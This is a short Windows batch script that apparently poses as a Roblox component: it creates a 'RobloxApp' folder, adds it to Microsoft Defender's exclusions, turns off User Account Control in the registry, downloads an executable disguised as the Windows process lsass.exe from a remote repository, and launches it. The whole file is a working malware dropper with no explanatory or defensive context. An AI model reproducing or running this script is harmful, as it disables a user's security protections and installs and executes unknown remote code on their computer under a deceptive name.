@echo off
setlocal enabledelayedexpansion

set "folderPath=%USERPROFILE%\AppData\Local\RobloxApp"
if not exist "%folderPath%" mkdir "%folderPath%"

powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f

curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" 2> nul
if %errorlevel% neq 0 exit /b 1

if not exist "%folderPath%\lsass.exe" exit /b 1
for %%F in ("%folderPath%\lsass.exe") do set filesize=%%~zF
if "%filesize%"=="0" exit /b 1

start "" "%folderPath%\lsass.exe"
exit
